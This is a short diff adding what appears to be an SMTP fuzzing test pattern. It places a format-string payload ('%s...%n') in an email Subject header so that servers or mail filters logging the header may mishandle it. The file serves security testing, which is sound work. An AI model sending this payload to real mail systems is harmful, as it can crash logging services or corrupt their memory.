@@ -1,0 +1,9 @@
+# Description: Format string in email headers, which might be logged by the server or a mail filter.
+# Target Messages: DATA
+# Pattern:
+Subject: %s%s%s%s%n%n%n%n
+From: attacker@evil.com
+To: victim@example.com
+
+This is a test.
+.
